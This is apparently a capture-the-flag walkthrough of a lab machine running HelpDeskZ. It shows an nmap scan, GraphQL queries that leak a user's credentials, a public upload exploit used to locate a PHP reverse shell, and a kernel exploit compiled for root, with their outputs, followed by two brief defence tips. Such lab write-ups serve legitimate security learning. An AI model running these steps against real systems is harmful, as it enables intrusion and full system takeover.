## Reconnaissance

Check open services/ports using nmap 

```
# Nmap 7.70 scan initiated Mon Mar 11 21:15:24 2019 as: nmap -vvv -p22,80,3000 -Pn --max-retries 2 -T4 -oN help-detailed-tcp -sC -sV 10.10.10.121
Nmap scan report for 10.10.10.121
Host is up, received user-set (0.15s latency).
Scanned at 2019-03-11 21:15:25 IST for 17s
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    syn-ack Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the open ports, we can see there are two applications running on 80 and 3000 respectively.

On running dirsearch, we can see there is a graphql endpoint on 3000. Fuzzing the endpoints and analyzing the errors, we found that the correct syntax to get the credentials from the query. 

```
GET /graphql?query={user{username}}
Host: http://10.10.10.121:3000

{"data":{"user":{"username":"helpme@helpme.com"}}}

GET /graphql?query={user{password}}
Host: http://10.10.10.121:3000

{"data":{"user":{"password":"5d3c93182bb20f07b994a7f617e99cff"}}}
```

Perfect! Got a username and hashed password. We can use this for spraying later on. 

On to the port 80, we can see there is a helpdesk application running on /support/ folder. Analyzing more about [HelpDeskZ](http://www.helpdeskz.com/), we can find two exploits. 
One is an unauthenticated file upload and authenticated SQL Injection. 

## Exploitation

From exploit-db, we can find the corresponding [exploit](https://www.exploit-db.com/exploits/40300). Reading through the exploit and the [helpdeskz code](https://github.com/evolutionscript/HelpDeskZ-1.0/blob/006662bb856e126a38f2bb76df44a2e4e3d37350/controllers/submit_ticket_controller.php), we can understand two things, 

1) PHP files are allowed to be uploaded by default.
2) Uploaded file names are generated by doing an MD5 on the the file name and uploaded time. 

Now that we have figured out how the exploit works, we can upload a PHP reverse shell manually and run the exploit to generate the file name to query it. 

When I tried to upload the shell using the 'Submit Ticket' functionality, the server was throwing an error saying file type is not allowed. 

<p align="center">
  <img src="https://github.com/gameFace22/vulnhub-walkthrough/blob/master/images/file-error.png">
</p>

After this, I was confused because the PHP files are not getting uploaded. Maybe the box creator removed the PHP from allowed extensions. 
From this point, I had tried multiple bypasses to exploit file upload vulnerability. Yet, I was getting the same error. 

Wanted a nudge on the right direction, so I took a break from the box and checked the forum to see if I am missing something. Most of the comments said to read the upload code carefully. 
Again I started from scratch on how the application handles file uploads. After spending sometime, figured out the file is being uploaded to the machine before the extenstion check is happening!

```
if(!isset($error_msg) && $settings['ticket_attachment']==1){
					$uploaddir = UPLOAD_DIR.'tickets/';		
					if($_FILES['attachment']['error'] == 0){
						$ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
						$filename = md5($_FILES['attachment']['name'].time()).".".$ext;
						$fileuploaded[] = array('name' => $_FILES['attachment']['name'], 'enc' => $filename, 'size' => formatBytes($_FILES['attachment']['size']), 'filetype' => $_FILES['attachment']['type']);
						$uploadedfile = $uploaddir.$filename;
						if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {
							$show_step2 = true;
							$error_msg = $LANG['ERROR_UPLOADING_A_FILE'];
						}else{
							$fileverification = verifyAttachment($_FILES['attachment']);
							switch($fileverification['msg_code']){
								case '1':
								$show_step2 = true;
								$error_msg = $LANG['INVALID_FILE_EXTENSION'];
								break;
								case '2':
								$show_step2 = true;
								$error_msg = $LANG['FILE_NOT_ALLOWED'];
								break;
```

From above code, we can see that switch case to handle upload errors is being done after the upload.

So whatever shell we have been uploading is in the server, we just need to figure out the file name using the exploit. 

On logging into the application to see the functionalities, there is an option to change the time zone. Since the exploit works based on time, it is better that both the victim and attacker machine should be synced to the same time zone. 
I changed the zone to GMT +530, figured out the UPLOAD_DIR from the code and tried running the exploit

```
(py2) [help] python2.7 40300.py http://10.10.10.121/support/uploads/tickets/ php-reverse-shell.php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
found!
http://10.10.10.121/support/uploads/tickets/648c7992e32db31087ed54a48e9543b6.php
```

Exploit worked like charm and we got a shell as user `help`

<p align="center">
  <img src="https://github.com/gameFace22/vulnhub-walkthrough/blob/master/images/help-basic-shell.png">
</p>

## Privilege Escalation

Our goal next is to escalate the privieleges to root. I found an updated version of [linux-exploit-suggester](https://github.com/jondonas/linux-exploit-suggester-2). 
Transferred the file to /tmp of the victim machine and ran the script to see if there are any known exploits. 

```
help@help:/tmp$ perl linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 4.4.0
  Searching among 73 exploits...

  Possible Exploits:
[+] af_packet
     CVE-2016-8655
     Source: https://www.exploit-db.com/exploits/40871/
[+] dirty_cow
     CVE-2016-5195
     Source: https://www.exploit-db.com/exploits/40616/
[+] exploit_x
     CVE-2018-14665
     Source: https://www.exploit-db.com/exploits/45697
[+] get_rekt
     CVE-2017-16695
     Source: https://www.exploit-db.com/exploits/45010
```

Luckily, there are a couple of exploits already available. After unsuccessful attempts at running dirtycow, tried get_rekt exploit and it worked. 

```
help@help:/tmp$ gcc 45010.c -o pwnnn
gcc 45010.c -o pwnnn
help@help:/tmp$ ./pwnnn
./pwnnn
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88000af66000
[*] Leaking sock struct from ffff880011d95800
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880020155e00
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff880020155e00
[*] credentials patched, launching shell...
# whoami
whoami
root
```

## Defense 

[1] Files should be validated before it getting uploaded to the server. <br>
[2] File names should be completely randomized. 

